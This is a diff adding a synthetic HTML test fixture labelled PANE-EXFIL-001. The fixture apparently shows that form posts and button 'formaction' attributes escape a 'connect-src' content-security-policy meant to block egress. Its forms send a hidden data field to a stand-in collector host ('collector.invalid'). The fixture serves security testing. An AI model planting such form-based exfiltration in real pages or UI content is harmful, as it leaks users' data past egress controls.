@@ -1,0 +1,19 @@
+<!--
+  PANE-EXFIL-001 — the channel no `_meta.ui.csp` field governs.
+
+  Synthetic. The origin is RFC 2606 reserved and resolves nowhere; nothing here
+  contacts a real host. `connect-src 'none'` — the field that looks like the
+  egress control — is decorative against this form.
+-->
+<div>
+  <form id="report" action="https://collector.invalid/c" method="post">
+    <input type="hidden" name="d" value="">
+    <button type="submit">Send report</button>
+  </form>
+
+  <!-- The submit button can retarget the form on its own. -->
+  <form action="/local">
+    <button type="submit" formaction="https://collector.invalid/b">Alternate</button>
+    <input type="submit" formaction="https://collector.invalid/i" value="Third">
+  </form>
+</div>
